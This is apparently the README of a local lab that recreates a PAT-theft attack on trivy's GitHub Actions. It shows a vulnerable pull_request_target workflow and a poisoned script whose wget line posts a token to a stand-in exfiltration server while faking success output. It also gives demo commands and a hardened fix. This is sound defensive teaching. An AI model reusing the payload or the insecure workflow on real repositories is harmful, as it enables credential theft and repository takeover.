# 🔐 Sandbox 6 - PAT Theft (aquasecurity/trivy)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | PAT theft via `pull_request_target` + poisoned script |
| **Real Target** | aquasecurity/trivy (25k+ stars) |
| **Attacker** | hackerbot-claw (Feb 28, 2026) |
| **Trigger** | `pull_request_target` with fork checkout |
| **Result** | ❌ PAT stolen - full repository compromise |
| **Fixed** | ✅ Attack blocked with `pull_request` trigger |

> 💡 **Note:** This is the **most severe attack** in the campaign.
> Unlike a `GITHUB_TOKEN` that expires after each workflow run,
> a **Personal Access Token (PAT)** is a long-lived credential.
> With a stolen PAT, the attacker can push commits, delete releases,
> rename the repository, and perform any action the PAT owner can do.

---

## 📁 Structure
```
sandbox-6-pat-theft/
│
├── vulnerable/                          ← ATTACKED VERSION
│   ├── .github/
│   │   └── workflows/
│   │       └── api-diff-check.yml      ← vulnerable workflow
│   └── scripts/
│       └── api-diff.sh                 ← legitimate script (replaced by attacker)
│
├── fixed/                               ← SECURED VERSION
│   ├── .github/
│   │   └── workflows/
│   │       └── api-diff-check.yml      ← hardened workflow
│   └── scripts/
│       └── api-diff.sh                 ← legitimate script
│
└── attacker/
    └── api-diff.sh                     ← poisoned script
```

---

## 🔄 Attack Flow

### Visual Diagram
```
┌──────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                          │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   1. Attacker opens PR with poisoned api-diff.sh          │
│                    ↓                                      │
│   2. pull_request_target trigger fires                    │
│      ⚠️  has access to secrets including PAT              │
│                    ↓                                      │
│   3. Workflow checks out FORK scripts                     │
│                    ↓                                      │
│   4. bash api-diff.sh executes poisoned script            │
│                    ↓                                      │
│   5. wget POST → PAT → attacker server                    │
│                    ↓                                      │
│   6. Attacker uses stolen PAT to:                         │
│      - Make repo private                                  │
│      - Delete all releases                                │
│      - Push malicious artifacts                           │
│                    ↓                                      │
│   ❌ Full repository compromise                           │
│                                                           │
├──────────────────────────────────────────────────────────┤
│                       THE FIX                             │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   Use pull_request trigger instead                        │
│   ✅ No access to PAT or secrets                          │
│                    ↓                                      │
│   ✅ Attack blocked                                       │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### Simplified Diagram
```
Attacker opens PR with poisoned api-diff.sh
           ↓
pull_request_target trigger (PAT exposed ⚠️)
           ↓
Checkout FORK scripts
           ↓
bash api-diff.sh → poisoned script runs
           ↓
wget → localhost:8888/exfil → PAT stolen
           ↓
❌ Full repo compromise - releases deleted, repo renamed
```

---

## ⚠️ Vulnerability Conditions

Three conditions must be met simultaneously:
```yaml
# ⚠️ Condition 1: pull_request_target trigger
on:
  pull_request_target:
  # DANGER: gives workflow access to secrets including PAT

# ⚠️ Condition 2: PAT exposed to the workflow
- run: bash scripts/api-diff.sh
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    MY_PAT: ${{ secrets.MY_PAT }}
    # DANGER: long-lived PAT accessible to attacker's script

# ⚠️ Condition 3: fork code executed directly
- uses: actions/checkout@v3
  with:
    ref: ${{ github.event.pull_request.head.sha }}
    # DANGER: checks out attacker's poisoned scripts
```

---

## 💣 Malicious Payload

The attacker replaces the legitimate `api-diff.sh` with a poisoned version:
```bash
#!/usr/bin/env bash
# ⚠️ MALICIOUS CODE - executes BEFORE legitimate code
# Silently exfiltrates PAT to attacker server

wget -q -O- \
  --post-data="pat=EXFILTRATED_PAT_ghp_abc123&repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR" \
  http://host.docker.internal:8888/exfil
# ↑ CRITICAL: long-lived PAT sent to attacker here

# ✅ Legitimate code below - victim sees only this
echo "Running API diff check..."
echo "No API differences found"
echo "Check passed successfully!"
```

> 💡 **Why is PAT theft more dangerous than GITHUB_TOKEN theft?**

| | `GITHUB_TOKEN` | `PAT` |
|---|---|---|
| **Lifetime** | Expires after workflow run | Long-lived - never expires |
| **Scope** | Single repository | Multiple repositories |
| **Revocation** | Automatic | Manual only |
| **Impact** | Limited to one run | Persistent access |

> 🔑 **Real-world impact on trivy:**
> The stolen PAT was used to make the repo private, delete all releases
> from v0.27.0 to v0.69.1, and push a malicious artifact to the
> VSCode marketplace - affecting thousands of developers.

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> The `event_pat_theft.json` simulates a PR opened from an
> **untrusted fork**, triggering the `pull_request_target` workflow
> and executing the attacker's poisoned `api-diff.sh` with PAT access.
```json
{
  "action": "opened",
  "pull_request": {
    "number": 1,
    "head": {
      "sha": "abc123",
      "ref": "main",
      "repo": {
        "full_name": "attacker/repo-fork"
      }
    },
    "base": {
      "repo": {
        "full_name": "owner/repo"
      }
    }
  },
  "repository": {
    "full_name": "owner/repo"
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Safety Disclaimer:**
> This demonstration runs **entirely locally** using `act` and Docker.
> `localhost:8888` is a **simulated exfiltration server** on your own machine.
> **No real PAT is used** - `EXFILTRATED_PAT_ghp_abc123def456` is a fake token.
> Never run these attacks against real repositories without explicit authorization.

### Step 1 - Start exfiltration server
```bash
# Terminal 2 - keep this running
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 - Copy malicious payload
```bash
# Terminal 1 - replace legitimate script with poisoned version
cp sandbox-6-pat-theft/attacker/api-diff.sh \
   sandbox-6-pat-theft/vulnerable/scripts/api-diff.sh
```

### Step 3 ❌ - Run Vulnerable Version
```bash
act pull_request_target \
    --eventpath event_pat_theft.json \
    --secret-file .secrets \
    -W sandbox-6-pat-theft/vulnerable/.github/workflows/api-diff-check.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - victim sees nothing suspicious:**
```
✅ Success - Main Run API diff check
| Running API diff check...
| No API differences found
| Check passed successfully!
🏁 Job succeeded
```

**Terminal 2 - attacker receives the PAT:**
```
==================================================
TOKEN EXFILTRATED!
Data: pat=EXFILTRATED_PAT_ghp_abc123&repo=owner/repo&actor=nektos/act
==================================================
❌ Attack succeeded - PAT stolen
```

### Step 4 ✅ - Run Fixed Version
```bash
# Restore legitimate script first
cp sandbox-6-pat-theft/fixed/scripts/api-diff.sh \
   sandbox-6-pat-theft/vulnerable/scripts/api-diff.sh

act pull_request \
    --eventpath event_pat_theft.json \
    --secret-file .secrets \
    -W sandbox-6-pat-theft/fixed/.github/workflows/api-diff-check.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - workflow runs safely:**
```
✅ Success - Main Run API diff check
| Running API diff check...
| No API differences found
| Check passed successfully!
🏁 Job succeeded
```

**Terminal 2:**
```
(no request received)
✅ Attack blocked - PAT never exposed
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Trigger | `pull_request_target` | `pull_request` |
| Permissions | `contents: write` | `contents: read` |
| Checkout | Fork scripts | Main branch only |
| `PAT` | Exposed to script | Not exposed |
| Token type | Long-lived PAT stolen | No sensitive token exposed |
```yaml
# ✅ FIXED WORKFLOW
on:
  pull_request:               # ✅ no access to secrets or PAT

permissions:
  contents: read              # ✅ minimum permissions

steps:
  - uses: actions/checkout@v3
    # ✅ no fork ref - main branch scripts only

  - run: bash scripts/api-diff.sh
    # ✅ PAT never exposed in env
    # ✅ legitimate script from main branch only
```

---

## 🌍 Real-World Impact

In the real attack on `aquasecurity/trivy`, the stolen PAT was used to:
```
1. Make the repository PRIVATE
   → renamed to aquasecurity/private-trivy

2. Delete ALL GitHub Releases
   → versions 0.27.0 to 0.69.1 deleted

3. Push malicious artifact
   → VSCode extension on Open VSX marketplace compromised

4. Vandalize README.md
   → commit pushed directly bypassing PR process
```

> This is **by far the most severe attack** in the campaign.
> While other targets suffered code execution inside CI runners,
> the trivy attack resulted in a **full repository takeover**
> and deletion of years of releases.

---

## 🔑 Key Lesson

> ⚠️ **Never expose long-lived PATs in `pull_request_target` workflows.**
>
> A stolen PAT gives the attacker **persistent access** to your repositories
> long after the workflow run has finished. Unlike `GITHUB_TOKEN`,
> a PAT never expires automatically.
>
> ✅ **Rule 1:** Always use `pull_request` - never `pull_request_target`
> when a PAT is needed in the workflow environment.
>
> ✅ **Rule 2:** Prefer the short-lived `GITHUB_TOKEN` over PATs.
>
> ✅ **Rule 3:** Apply the **principle of least privilege** -
> grant only the permissions actually needed.
>
> 🔑 **Remember:** A stolen PAT is not just a token -
> it is **persistent access to your entire GitHub account**.

---

## 🔗 References

- [Real attack analysis - StepSecurity](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [Aqua Security incident disclosure](https://github.com/aquasecurity/trivy/discussions/10265)
- [GitHub Actions security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [act - Local GitHub Actions runner](https://github.com/nektos/act)
